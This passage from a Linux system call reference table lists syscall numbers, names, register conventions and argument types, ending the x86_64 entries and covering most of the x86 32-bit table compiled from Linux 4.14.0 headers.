271 process_vm_writev man/ cs/ 0x10f pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 272 kcmp man/ cs/ 0x110 pid_t pid1 pid_t pid2 int type unsigned long idx1 unsigned long idx2 - 273 finit_module man/ cs/ 0x111 int fd const char *uargs int flags - - - 274 sched_setattr man/ cs/ 0x112 pid_t pid struct sched_attr *attr unsigned int flags - - - 275 sched_getattr man/ cs/ 0x113 pid_t pid struct sched_attr *attr unsigned int size unsigned int flags - - 276 renameat2 man/ cs/ 0x114 int olddfd const char *oldname int newdfd const char *newname unsigned int flags - 277 seccomp man/ cs/ 0x115 unsigned int op unsigned int flags void *uargs - - - 278 getrandom man/ cs/ 0x116 char *buf size_t count unsigned int flags - - - 279 memfd_create man/ cs/ 0x117 const char *uname_ptr unsigned int flags - - - - 280 bpf man/ cs/ 0x118 int cmd union bpf_attr *attr unsigned int size - - - 281 execveat man/ cs/ 0x119 int dfd const char *filename const char const argv const char const envp int flags - 282 userfaultfd man/ cs/ 0x11a int flags - - - - - 283 membarrier man/ cs/ 0x11b int cmd int flags - - - - 284 mlock2 man/ cs/ 0x11c unsigned long start size_t len int flags - - - 285 copy_file_range man/ cs/ 0x11d int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 286 preadv2 man/ cs/ 0x11e unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 287 pwritev2 man/ cs/ 0x11f unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 288 pkey_mprotect man/ cs/ 0x120 unsigned long start size_t len unsigned long prot int pkey - - 289 pkey_alloc man/ cs/ 0x121 unsigned long flags unsigned long init_val - - - - 290 pkey_free man/ cs/ 0x122 int pkey - - - - - 291 statx man/ cs/ 0x123 int dfd const char *path unsigned flags unsigned mask struct statx *buffer - x86 (32-bit)Compiled from Linux 4.14.0 headers. NR syscall name references %eax arg0 (%ebx) arg1 (%ecx) arg2 (%edx) arg3 (%esi) arg4 (%edi) arg5 (%ebp) 0 restart_syscall man/ cs/ 0x00 - - - - - - 1 exit man/ cs/ 0x01 int error_code - - - - - 2 fork man/ cs/ 0x02 - - - - - - 3 read man/ cs/ 0x03 unsigned int fd char *buf size_t count - - - 4 write man/ cs/ 0x04 unsigned int fd const char *buf size_t count - - - 5 open man/ cs/ 0x05 const char *filename int flags umode_t mode - - - 6 close man/ cs/ 0x06 unsigned int fd - - - - - 7 waitpid man/ cs/ 0x07 pid_t pid int *stat_addr int options - - - 8 creat man/ cs/ 0x08 const char *pathname umode_t mode - - - - 9 link man/ cs/ 0x09 const char *oldname const char *newname - - - - 10 unlink man/ cs/ 0x0a const char *pathname - - - - - 11 execve man/ cs/ 0x0b const char *filename const char const argv const char const envp - - - 12 chdir man/ cs/ 0x0c const char *filename - - - - - 13 time man/ cs/ 0x0d time_t *tloc - - - - - 14 mknod man/ cs/ 0x0e const char *filename umode_t mode unsigned dev - - - 15 chmod man/ cs/ 0x0f const char *filename umode_t mode - - - - 16 lchown man/ cs/ 0x10 const char *filename uid_t user gid_t group - - - 17 break man/ cs/ 0x11 ? ? ? ? ? ? 18 oldstat man/ cs/ 0x12 ? ? ? ? ? ? 19 lseek man/ cs/ 0x13 unsigned int fd off_t offset unsigned int whence - - - 20 getpid man/ cs/ 0x14 - - - - - - 21 mount man/ cs/ 0x15 char *dev_name char *dir_name char *type unsigned long flags void *data - 22 umount man/ cs/ 0x16 char *name int flags - - - - 23 setuid man/ cs/ 0x17 uid_t uid - - - - - 24 getuid man/ cs/ 0x18 - - - - - - 25 stime man/ cs/ 0x19 time_t *tptr - - - - - 26 ptrace man/ cs/ 0x1a long request long pid unsigned long addr unsigned long data - - 27 alarm man/ cs/ 0x1b unsigned int seconds - - - - - 28 oldfstat man/ cs/ 0x1c ? ? ? ? ? ? 29 pause man/ cs/ 0x1d - - - - - - 30 utime man/ cs/ 0x1e char *filename struct utimbuf *times - - - - 31 stty man/ cs/ 0x1f ? ? ? ? ? ? 32 gtty man/ cs/ 0x20 ? ? ? ? ? ? 33 access man/ cs/ 0x21 const char *filename int mode - - - - 34 nice man/ cs/ 0x22 int increment - - - - - 35 ftime man/ cs/ 0x23 ? ? ? ? ? ? 36 sync man/ cs/ 0x24 - - - - - - 37 kill man/ cs/ 0x25 pid_t pid int sig - - - - 38 rename man/ cs/ 0x26 const char *oldname const char *newname - - - - 39 mkdir man/ cs/ 0x27 const char *pathname umode_t mode - - - - 40 rmdir man/ cs/ 0x28 const char *pathname - - - - - 41 dup man/ cs/ 0x29 unsigned int fildes - - - - - 42 pipe man/ cs/ 0x2a int *fildes - - - - - 43 times man/ cs/ 0x2b struct tms *tbuf - - - - - 44 prof man/ cs/ 0x2c ? ? ? ? ? ? 45 brk man/ cs/ 0x2d unsigned long brk - - - - - 46 setgid man/ cs/ 0x2e gid_t gid - - - - - 47 getgid man/ cs/ 0x2f - - - - - - 48 signal man/ cs/ 0x30 int sig __sighandler_t handler - - - - 49 geteuid man/ cs/ 0x31 - - - - - - 50 getegid man/ cs/ 0x32 - - - - - - 51 acct man/ cs/ 0x33 const char *name - - - - - 52 umount2 man/ cs/ 0x34 ? ? ? ? ? ? 53 lock man/ cs/ 0x35 ? ? ? ? ? ? 54 ioctl man/ cs/ 0x36 unsigned int fd unsigned int cmd unsigned long arg - - - 55 fcntl man/ cs/ 0x37 unsigned int fd unsigned int cmd unsigned long arg - - - 56 mpx man/ cs/ 0x38 ? ? ? ? ? ? 57 setpgid man/ cs/ 0x39 pid_t pid pid_t pgid - - - - 58 ulimit man/ cs/ 0x3a ? ? ? ? ? ? 59 oldolduname man/ cs/ 0x3b ? ? ? ? ? ? 60 umask man/ cs/ 0x3c int mask - - - - - 61 chroot man/ cs/ 0x3d const char *filename - - - - - 62 ustat man/ cs/ 0x3e unsigned dev struct ustat *ubuf - - - - 63 dup2 man/ cs/ 0x3f unsigned int oldfd unsigned int newfd - - - - 64 getppid man/ cs/ 0x40 - - - - - - 65 getpgrp man/ cs/ 0x41 - - - - - - 66 setsid man/ cs/ 0x42 - - - - - - 67 sigaction man/ cs/ 0x43 int const struct old_sigaction * struct old_sigaction * - - - 68 sgetmask man/ cs/ 0x44 - - - - - - 69 ssetmask man/ cs/ 0x45 int newmask - - - - - 70 setreuid man/ cs/ 0x46 uid_t ruid uid_t euid - - - - 71 setregid man/ cs/ 0x47 gid_t rgid gid_t egid - - - - 72 sigsuspend man/ cs/ 0x48 int unused1 int unused2 old_sigset_t mask - - - 73 sigpending man/ cs/ 0x49 old_sigset_t *uset - - - - - 74 sethostname man/ cs/ 0x4a char *name int len - - - - 75 setrlimit man/ cs/ 0x4b unsigned int resource struct rlimit *rlim - - - - 76 getrlimit man/ cs/ 0x4c unsigned int resource struct rlimit *rlim - - - - 77 getrusage man/ cs/ 0x4d int who struct rusage *ru - - - - 78 gettimeofday man/ cs/ 0x4e struct timeval *tv struct timezone *tz - - - - 79 settimeofday man/ cs/ 0x4f struct timeval *tv struct timezone *tz - - - - 80 getgroups man/ cs/ 0x50 int gidsetsize gid_t *grouplist - - - - 81 setgroups man/ cs/ 0x51 int gidsetsize gid_t *grouplist - - - - 82 select man/ cs/ 0x52 int n fd_set *inp fd_set *outp fd_set *exp struct timeval *tvp - 83 symlink man/ cs/ 0x53 const char *old const char *new - - - - 84 oldlstat man/ cs/ 0x54 ? ? ? ? ? ? 85 readlink man/ cs/ 0x55 const char *path char *buf int bufsiz - - - 86 uselib man/ cs/ 0x56 const char *library - - - - - 87 swapon man/ cs/ 0x57 const char *specialfile int swap_flags - - - - 88 reboot man/ cs/ 0x58 int magic1 int magic2 unsigned int cmd void *arg - - 89 readdir man/ cs/ 0x59 ? ? ? ? ? ? 90 mmap man/ cs/ 0x5a ? ? ? ? ? ? 91 munmap man/ cs/ 0x5b unsigned long addr size_t len - - - - 92 truncate man/ cs/ 0x5c const char *path long length - - - - 93 ftruncate man/ cs/ 0x5d unsigned int fd unsigned long length - - - - 94 fchmod man/ cs/ 0x5e unsigned int fd umode_t mode - - - - 95 fchown man/ cs/ 0x5f unsigned int fd uid_t user gid_t group - - - 96 getpriority man/ cs/ 0x60 int which int who - - - - 97 setpriority man/ cs/ 0x61 int which int who int niceval - - - 98 profil man/ cs/ 0x62 ? ? ? ? ? ? 99 statfs man/ cs/ 0x63 const char * path struct statfs *buf - - - - 100 fstatfs man/ cs/ 0x64 unsigned int fd struct statfs *buf - - - - 101 ioperm man/ cs/ 0x65 unsigned long from unsigned long num int on - - - 102 socketcall man/ cs/ 0x66 int call unsigned long *args - - - - 103 syslog man/ cs/ 0x67 int type char *buf int len - - - 104 setitimer man/ cs/ 0x68 int which struct itimerval *value struct itimerval *ovalue - - - 105 getitimer man/ cs/ 0x69 int which struct itimerval *value - - - - 106 stat man/ cs/ 0x6a const char *filename struct __old_kernel_stat *statbuf - - - - 107 lstat man/ cs/ 0x6b const char *filename struct __old_kernel_stat *statbuf - - - - 108 fstat man/ cs/ 0x6c unsigned int fd struct __old_kernel_stat *statbuf - - - - 109 olduname man/ cs/ 0x6d struct oldold_utsname * - - - - - 110 iopl man/ cs/ 0x6e ? ? ? ? ? ? 111 vhangup man/ cs/ 0x6f - - - - - - 112 idle man/ cs/ 0x70 ? ? ? ? ? ? 113 vm86old man/ cs/ 0x71 ? ? ? ? ? ? 114 wait4 man/ cs/ 0x72 pid_t pid int *stat_addr int options struct rusage *ru - - 115 swapoff man/ cs/ 0x73 const char *specialfile - - - - - 116 sysinfo man/ cs/ 0x74 struct sysinfo *info - - - - - 117 ipc man/ cs/ 0x75 unsigned int call int first unsigned long second unsigned long third void *ptr long fifth 118 fsync man/ cs/ 0x76 unsigned int fd - - - - - 119 sigreturn man/ cs/ 0x77 ? ? ? ? ? ? 120 clone man/ cs/ 0x78 unsigned long unsigned long int * int * unsigned long - 121 setdomainname man/ cs/ 0x79 char *name int len - - - - 122 uname man/ cs/ 0x7a struct old_utsname * - - - - - 123 modify_ldt man/ cs/ 0x7b ? ? ? ? ? ? 124 adjtimex man/ cs/ 0x7c struct __kernel_timex *txc_p - - - - - 125 mprotect man/ cs/ 0x7d unsigned long start size_t len unsigned long prot - - - 126 sigprocmask man/ cs/ 0x7e int how old_sigset_t *set old_sigset_t *oset - - - 127 create_module man/ cs/ 0x7f ? ? ? ? ? ? 128 init_module man/ cs/ 0x80 void *umod unsigned long len const char *uargs - - - 129 delete_module man/ cs/ 0x81 const char *name_user unsigned int flags - - - - 130 get_kernel_syms man/ cs/ 0x82 ? ? ? ? ? ? 131 quotactl man/ cs/ 0x83 unsigned int cmd const char *special qid_t id void *addr - - 132 getpgid man/ cs/ 0x84 pid_t pid - - - - - 133 fchdir man/ cs/ 0x85 unsigned int fd - - - - - 134 bdflush man/ cs/ 0x86 int func long data - - - - 135 sysfs man/ cs/ 0x87 int option unsigned long arg1 unsigned long arg2 - - - 136 personality man/ cs/ 0x88 unsigned int personality - - - - - 137 afs_syscall man/ cs/ 0x89 ? ? ? ? ? ? 138 setfsuid man/ cs/ 0x8a uid_t uid - - - - - 139 setfsgid man/ cs/ 0x8b gid_t gid - - - - - 140 _llseek man/ cs/ 0x8c ? ? ? ? ? ? 141 getdents man/ cs/ 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count - - - 142 _newselect man/ cs/ 0x8e ? ? ? ? ? ? 143 flock man/ cs/ 0x8f unsigned int fd unsigned int cmd - - - - 144 msync man/ cs/ 0x90 unsigned long start size_t len int flags - - - 145 readv man/ cs/ 0x91 unsigned long fd const struct iovec *vec unsigned long vlen - - - 146 writev man/ cs/ 0x92 unsigned long fd const struct iovec *vec unsigned long vlen - - - 147 getsid man/ cs/ 0x93 pid_t pid - - - - - 148 fdatasync man/ cs/ 0x94 unsigned int fd - - - - - 149 _sysctl man/ cs/ 0x95 ? ? ? ? ? ? 150 mlock man/ cs/ 0x96 unsigned long start size_t len - - - - 151 munlock man/ cs/ 0x97 unsigned long start size_t len - - - - 152 mlockall man/ cs/ 0x98 int flags - - - - - 153 munlockall man/ cs/ 0x99 - - - - - - 154 sched_setparam man/ cs/ 0x9a pid_t pid struct sched_param *param - - - - 155 sched_getparam man/ cs/ 0x9b pid_t pid struct sched_param *param - - - - 156 sched_setscheduler man/ cs/ 0x9c pid_t pid int policy struct sched_param *param - - - 157 sched_getscheduler man/ cs/ 0x9d pid_t pid - - - - - 158 sched_yield man/ cs/ 0x9e - - - - - - 159 sched_get_priority_max man/ cs/ 0x9f int policy - - - - - 160 sched_get_priority_min man/ cs/ 0xa0 int policy - - - - - 161 sched_rr_get_interval man/ cs/ 0xa1 pid_t pid struct __kernel_timespec *interval - - - - 162 nanosleep man/ cs/ 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - - - 163 mremap man/ cs/ 0xa3 unsigned long addr unsigned long old_len unsigned long new_len unsigned long flags unsigned long new_addr - 164 setresuid man/ cs/ 0xa4 uid_t ruid uid_t euid uid_t suid - - - 165 getresuid man/ cs/ 0xa5 uid_t *ruid uid_t *euid uid_t *suid - - - 166 vm86 man/ cs/ 0xa6 ? ? ? ? ? ? 167 query_module man/ cs/ 0xa7 ? ? ? ? ? ? 168 poll man/ cs/ 0xa8 struct pollfd *ufds unsigned int nfds int timeout - - - 169 nfsservctl man/ cs/ 0xa9 ? ? ? ? ? ? 170 setresgid man/ cs/ 0xaa gid_t rgid gid_t egid gid_t sgid - - - 171 getresgid man/ cs/ 0xab gid_t *rgid gid_t *egid gid_t *sgid - - - 172 prctl man/ cs/ 0xac int option unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 173 rt_sigreturn man/ cs/ 0xad ? ? ? ? ? ? 174 rt_sigaction man/ cs/ 0xae int const struct sigaction * struct sigaction * size_t - - 175 rt_sigprocmask man/ cs/ 0xaf int how sigset_t *set sigset_t *oset size_t sigsetsize - - 176 rt_sigpending man/ cs/ 0xb0 sigset_t *set size_t sigsetsize - - - - 177 rt_sigtimedwait man/ cs/ 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts size_t sigsetsize - - 178 rt_sigqueueinfo man/ cs/ 0xb2 pid_t pid int sig siginfo_t *uinfo - - - 179 rt_sigsuspend man/ cs/ 0xb3 sigset_t *unewset size_t sigsetsize - - - - 180 pread64 man/ cs/ 0xb4 unsigned int fd char *buf size_t count loff_t pos - - 181 pwrite64 man/ cs/ 0xb5 unsigned int fd const char *buf size_t count loff_t pos - - 182 chown man/ cs/ 0xb6 const char *filename uid_t user gid_t group - - - 183 getcwd man/ cs/ 0xb7 char *buf unsigned long size - - - - 184 capget man/ cs/ 0xb8 cap_user_header_t header cap_user_data_t dataptr - - - - 185 capset man/ cs/ 0xb9 cap_user_header_t header const cap_user_data_t data - - - - 186 sigaltstack man/ cs/ 0xba const struct sigaltstack *uss struct sigaltstack *uoss - - - - 187 sendfile man/ cs/ 0xbb int out_fd int in_fd off_t *offset size_t count - - 188 getpmsg man/ cs/ 0xbc ? ? ? ? ? ? 189 putpmsg man/ cs/ 0xbd ? ? ? ? ? ? 190 vfork man/ cs/ 0xbe - - - - - - 191 ugetrlimit man/ cs/ 0xbf ? ? ? ? ? ? 192 mmap2 man/ cs/ 0xc0 ? ? ? ? ? ? 193 truncate64 man/ cs/ 0xc1 const char *path loff_t length - - - - 194 ftruncate64 man/ cs/ 0xc2 unsigned int fd loff_t length - - - - 195 stat64 man/ cs/ 0xc3 const char *filename struct stat64 *statbuf - - - - 196 lstat64 man/ cs/ 0xc4 const char *filename struct stat64 *statbuf - - - - 197 fstat64 man/ cs/ 0xc5 unsigned long fd struct stat64 *statbuf - - - - 198 lchown32 man/ cs/ 0xc6 ? ? ? ? ? ? 199 getuid32 man/ cs/ 0xc7 ? ? ? ? ? ? 200 getgid32 man/ cs/ 0xc8 ? ? ? ? ? ? 201 geteuid32 man/ cs/ 0xc9 ? ? ? ? ? ? 202 getegid32 man/ cs/ 0xca ? ? ? ? ? ? 203 setreuid32 man/ cs/ 0xcb ? ? ? ? ? ? 204 setregid32 man/ cs/ 0xcc ? ? ? ? ? ? 205 getgroups32 man/ cs/ 0xcd ? ? ? ? ? ? 206 setgroups32 man/ cs/ 0xce ? ? ? ? ? ? 207 fchown32 man/ cs/ 0xcf ? ? ? ? ? ? 208 setresuid32 man/ cs/ 0xd0 ? ? ? ? ? ? 209 getresuid32 man/ cs/ 0xd1 ? ? ? ? ? ? 210 setresgid32 man/ cs/ 0xd2 ? ? ? ? ? ? 211 getresgid32 man/ cs/ 0xd3 ? ? ? ? ? ? 212 chown32 man/ cs/ 0xd4 ? ? ? ? ? ? 213 setuid32 man/ cs/ 0xd5 ? ? ? ? ? ? 214 setgid32 man/ cs/ 0xd6 ? ? ? ? ? ? 215 setfsuid32 man/ cs/ 0xd7 ? ? ? ? ? ? 216 setfsgid32 man/ cs/ 0xd8 ? ? ? ? ? ? 217 pivot_root man/ cs/ 0xd9 const char *new_root const char *put_old - - - - 218 mincore man/ cs/ 0xda unsigned long start size_t len unsigned char * vec - - - 219 madvise man/ cs/ 0xdb unsigned long start size_t len int behavior - - - 220 getdents64 man/ cs/ 0xdc unsigned int fd struct linux_dirent64 *dirent unsigned int count - - - 221 fcntl64 man/ cs/ 0xdd unsigned int fd unsigned int cmd unsigned long arg - - - 222 not implemented 0xde 223 not implemented 0xdf 224 gettid man/ cs/ 0xe0 - - - - - - 225 readahead man/ cs/ 0xe1 int fd loff_t offset size_t count - - - 226 setxattr man/ cs/ 0xe2 const char *path const char *name const void *value size_t size int flags - 227 lsetxattr man/ cs/ 0xe3 const char *path const char *name const void *value size_t size int flags - 228 fsetxattr man/ cs/ 0xe4 int fd const char *name const void *value size_t size int flags - 229 getxattr man/ cs/ 0xe5 const char *path const char *name void *value size_t size - - 230 lgetxattr man/ cs/ 0xe6 const char *path const char *name void *value size_t size - - 231 fgetxattr man/ cs/ 0xe7 int fd const char *name void *value size_t size - - 232 listxattr man/ cs/ 0xe8 const char *path char *list size_t size - - - 233 llistxattr man/ cs/ 0xe9 const char *path char *list size_t size - - - 234 flistxattr man/ cs/ 0xea int fd char *list size_t size - - - 235 removexattr man/ cs/ 0xeb const char *path const char *name - - - - 236 lremovexattr man/ cs/ 0xec const char *path const char *name - - - - 237 fremovexattr man/ cs/ 0xed int fd const char *name - - - - 238 tkill man/ cs/ 0xee pid_t pid int sig - - - - 239 sendfile64 man/ cs/ 0xef int out_fd int in_fd loff_t *offset size_t count - - 240 futex man/ cs/ 0xf0 u32 *uaddr int op u32 val struct __kernel_timespec *utime u32 *uaddr2 u32 val3 241 sched_setaffinity man/ cs/ 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 242 sched_getaffinity man/ cs/ 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 243 set_thread_area man/ cs/ 0xf3 ? ? ? ? ? ? 244 get_thread_area man/ cs/ 0xf4 ? ? ? ? ? ? 245 io_setup man/ cs/ 0xf5 unsigned nr_reqs aio_context_t *ctx - - - - 246 io_destroy man/ cs/ 0xf6 aio_context_t ctx - - - - - 247 io_getevents man/ cs/ 0xf7 aio_context_t ctx_id long min_nr long nr struct io_event *events struct __kernel_timespec *timeout - 248 io_submit man/ cs/ 0xf8 aio_context_t long struct iocb - - - 249 io_cancel man/ cs/ 0xf9 aio_context_t ctx_id struct iocb *iocb struct io_event *result - - - 250 fadvise64 man/ cs/ 0xfa int fd loff_t offset size_t len int advice - - 251 not implemented 0xfb 252 exit_group man/ cs/ 0xfc int error_code - - - - - 253 lookup_dcookie man/ cs/ 0xfd u64 cookie64 char *buf size_t len - - - 254 epoll_create man/ cs/ 0xfe int size - - - - - 255 epoll_ctl man/ cs/ 0xff int epfd int op int fd struct epoll_event *event - - 256 epoll_wait man/ cs/ 0x100 int epfd struct epoll_event *events int maxevents int timeout - - 257 remap_file_pages man/ cs/ 0x101 unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags - 258 set_tid_address man/ cs/ 0x102 int *tidptr - - - - - 259 timer_create man/ cs/ 0x103 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id - - - 260 timer_settime man/ cs/ 0x104 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting struct __kernel_itimerspec *old_setting - - 261 timer_gettime man/ cs/ 0x105 timer_t timer_id struct __kernel_itimerspec *setting - - - - 262 timer_getoverrun man/ cs/ 0x106 timer_t timer_id - - - - - 263 timer_delete man/ cs/ 0x107 timer_t timer_id - - - - - 264 clock_settime man/ cs/ 0x108 clockid_t which_clock const struct __kernel_timespec *tp - - - - 265 clock_gettime man/ cs/ 0x109 clockid_t which_clock struct __kernel_timespec *tp - - - - 266 clock_getres man/ cs/ 0x10a clockid_t which_clock struct __kernel_timespec *tp - - - - 267 clock_nanosleep man/ cs/ 0x10b clockid_t which_clock int flags const struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - 268 statfs64 man/ cs/ 0x10c const char *path size_t sz struct statfs64 *buf - - - 269 fstatfs64 man/ cs/ 0x10d unsigned int fd size_t sz struct statfs64 *buf - - - 270 tgkill man/ cs/ 0x10e pid_t tgid pid_t pid int sig - - - 271 utimes man/ cs/ 0x10f char *filename struct timeval *utimes - - - - 272 fadvise64_64 man/ cs/ 0x110 int fd loff_t offset loff_t len int advice - - 273 vserver man/ cs/ 0x111 ? ? ? ? ? ? 274 mbind man/ cs/ 0x112 unsigned long start unsigned long len unsigned long mode const unsigned long *nmask unsigned long maxnode unsigned flags 275 get_mempolicy man/ cs/ 0x113 int *policy unsigned long *nmask unsigned long maxnode unsigned long addr unsigned long flags - 276 set_mempolicy man/ cs/ 0x114 int mode const unsigned long *nmask unsigned long maxnode - - - 277 mq_open man/ cs/ 0x115 const char *name int oflag umode_t mode struct mq_attr *attr - - 278 mq_unlink man/ cs/ 0x116 const char *name - - - - - 279 mq_timedsend man/ cs/ 0x117 mqd_t mqdes const char *msg_ptr size_t msg_len unsigned int msg_prio const struct __kernel_timespec *abs_timeout - 280 mq_timedreceive man/ cs/ 0x118 mqd_t mqdes char *msg_ptr size_t msg_len unsigned int *msg_prio const struct __kernel_timespec *abs_timeout - 281 mq_notify man/ cs/ 0x119 mqd_t mqdes const struct sigevent *notification - - - - 282 mq_getsetattr man/ cs/ 0x11a mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat - - - 283 kexec_load man/ cs/ 0x11b unsigned long entry unsigned long nr_segments struct kexec_segment *segments unsigned long flags - - 284 waitid man/ cs/ 0x11c int which pid_t pid struct siginfo *infop int options struct rusage *ru - 285 not implemented 0x11d 286 add_key man/ cs/ 0x11e const char *_type const char *_description const void *_payload size_t plen key_serial_t destringid - 287 request_key man/ cs/ 0x11f const char *_type const char *_description const char *_callout_info key_serial_t destringid - - 288 keyctl man/ cs/ 0x120 int cmd unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 289 ioprio_set man/ cs/ 0x121 int which int who int ioprio - - - 290 ioprio_get man/ cs/ 0x122 int which int who - - - - 291 inotify_init man/ cs/ 0x123 - - - - - - 292 inotify_add_watch man/ cs/ 0x124 int fd const char *path u32 mask - - - 293 inotify_rm_watch man/ cs/ 0x125 int fd __s32 wd - - - - 294 migrate_pages man/ cs/ 0x126 pid_t pid unsigned long maxnode const unsigned long *from const unsigned long *to - - 295 openat man/ cs/ 0x127 int dfd const char *filename int flags umode_t mode - - 296 mkdirat man/ cs/ 0x128 int dfd const char * pathname umode_t mode - - - 297 mknodat man/ cs/ 0x129 int dfd const char * filename umode_t mode unsigned dev - - 298 fchownat man/ cs/ 0x12a int dfd const char *filename uid_t user gid_t group int flag - 299 futimesat man/ cs/ 0x12b int dfd const char *filename struct timeval *utimes - - - 300 fstatat64 man/ cs/ 0x12c int dfd const char *filename struct stat64 *statbuf int flag - - 301 unlinkat man/ cs/ 0x12d int dfd const char * pathname int flag - - - 302 renameat man/ cs/ 0x12e int olddfd const char * oldname int newdfd const char * newname - - 303 linkat man/ cs/ 0x12f int olddfd const char *oldname int newdfd const char *newname int flags - 304 symlinkat man/ cs/ 0x130 const char * oldname int newdfd const char * newname - - - 305 readlinkat man/ cs/ 0x131 int dfd const char *path char *buf int bufsiz - - 306 fchmodat man/ cs/ 0x132 int dfd const char * filename umode_t mode - - - 307 faccessat man/ cs/ 0x133 int dfd const char *filename int mode - - - 308 pselect6 man/ cs/ 0x134 int fd_set * fd_set * fd_set * struct __kernel_timespec * void * 309 ppoll man/ cs/ 0x135 struct pollfd * unsigned int struct __kernel_timespec * const sigset_t * size_t - 310 unshare man/ cs/ 0x136 unsigned long unshare_flags - - - - - 311 set_robust_list man/ cs/ 0x137 struct robust_list_head *head size_t len - - - - 312 get_robust_list man/ cs/ 0x138 int pid struct robust_list_head head_ptr size_t *len_ptr - - - 313 splice man/ cs/ 0x139 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 314 sync_file_range man/ cs/ 0x13a int fd loff_t offset loff_t nbytes unsigned int flags - - 315 tee man/ cs/ 0x13b int fdin int fdout size_t len unsigned int flags - - 316 vmsplice man/ cs/ 0x13c int fd const struct iovec *iov unsigned long nr_segs unsigned int flags - - 317 move_pages man/ cs/ 0x13d pid_t pid unsigned long nr_pages const void pages const int *nodes int *status int flags 318 getcpu man/ cs/ 0x13e unsigned *cpu unsigned *node struct getcpu_cache *cache - - - 319 epoll_pwait man/ cs/ 0x13f int epfd struct epoll_event *events int maxevents int timeout const sigset_t *sigmask size_t sigsetsize 320 utimensat man/ cs/ 0x140 int dfd const char *filename struct __kernel_timespec *utimes int flags - - 321 signalfd man/ cs/ 0x141 int ufd sigset_t *user_mask size_t sizemask - - - 322 timerfd_create man/ cs/ 0x142 int clockid int flags - - - - 323 eventfd man/ cs/ 0x143 unsigned int count - - - - - 324 fallocate man/ cs/ 0x144 int fd int mode loff_t offset loff_t len - - 325 timerfd_settime man/ cs/ 0x145 int ufd int flags const struct __kernel_itimerspec *utmr struct __kernel_itimerspec *otmr - - 326 timerfd_gettime man/ cs/ 0x146 int ufd struct __kernel_itimerspec *otmr - - - - 327 signalfd4 man/ cs/ 0x147 int ufd sigset_t *user_mask size_t sizemask int flags - - 328 eventfd2 man/ cs/ 0x148 unsigned int count int flags - - - - 329 epoll_create1 man/ cs/ 0x149 int flags - - - - - 330 dup3 man/ cs/ 0x14a unsigned int oldfd unsigned int newfd int flags - - - 331 pipe2 man/ cs/ 0x14b int *fildes int flags - - - - 332 inotify_init1 man/ cs/ 0x14c int flags - - - - - 333 preadv man/ cs/ 0x14d unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 334 pwritev man/ cs/ 0x14e unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 335 rt_tgsigqueueinfo man/ cs/ 0x14f pid_t tgid pid_t pid int sig siginfo_t *uinfo - - 336 perf_event_open man/ cs/ 0x150 struct perf_event_attr *attr_uptr pid_t pid int cpu int group_fd unsigned long flags - 337 recvmmsg man/ cs/ 0x151 int fd struct mmsghdr *msg unsigned int vlen unsigned flags struct __kernel_timespec *timeout - 338 fanotify_init man/ cs/ 0x152 unsigned int flags unsigned int event_f_flags - - - - 339 fanotify_mark man/ cs/ 0x153 int fanotify_fd unsigned int flags u64 mask int fd const char *pathname - 340 prlimit64 man/ cs/ 0x154 pid_t pid unsigned int resource const struct rlimit64 *new_rlim struct rlimit64 *old_rlim - - 341 name_to_handle_at man/ cs/ 0x155 int dfd const char *name struct file_handle *handle int *mnt_id int flag - 342 open_by_handle_at man/ cs/ 0x156 int mountdirfd struct file_handle *handle int flags - - - 343 clock_adjtime man/ cs/ 0x157 clockid_t which_clock struct __kernel_timex *tx - - - - 344 syncfs man/ cs/ 0x158 int fd - - - - - 345 sendmmsg man/ cs/ 0x159 int fd struct mmsghdr *msg unsigned int vlen unsigned flags - - 346 setns man/ cs/ 0x15a int fd int nstype - - - - 347 process_vm_readv man/ cs/ 0x15b pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 348 process_vm_writev man/ cs/ 0x15c pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 349 kcmp man/ cs/ 0x15d pid_t pid1 pid_t pid2 int type unsigned long idx1 unsigned long idx2 - 350 finit_module man/ cs/ 0x15e int fd const char *uargs int flags - - - 351 sched_setattr man/ cs/ 0x15f pid_t pid struct sched_attr *attr unsigned int flags - - - 352 sched_getattr man/ cs/ 0x160 pid_t pid struct sched_attr *attr unsigned int size unsigned int flags - - 353 renameat2 man/ cs/ 0x161 int olddfd const char *oldname int newdfd const char *newname unsigned int flags - 354 seccomp man/ cs/ 0x162 unsigned int op unsigned int flags void *uargs - - - 355 getrandom man/ cs/ 0x163 char *buf size_t count unsigned int flags - - - 356 memfd_create man/ cs/ 0x164 const char *uname_ptr unsigned int flags - - - - 357 bpf man/ cs/ 0x165 int cmd union bpf_attr *attr unsigned int size - - - 358 execveat man/ cs/ 0x166 int dfd const char *filename const char const argv const char const envp int flags - 359 socket man/ cs/ 0x167 int int int - - - 360 socketpair man/ cs/ 0x168 int int int int * - - 361 bind man/ cs/ 0x169 int struct sockaddr * int - - - 362 connect man/ cs/ 0x16a int struct sockaddr * int - - - 363 listen man/ cs/ 0x16b int int - - - - 364 accept4 man/ cs/ 0x16c int struct sockaddr * int * int - - 365 getsockopt man/ cs/ 0x16d int fd int level int optname char *optval int *optlen - 366 setsockopt man/ cs/ 0x16e int fd int level int optname char *optval int optlen - 367 getsockname man/ cs/ 0x16f int struct sockaddr * int * - - - 368 getpeername man/ 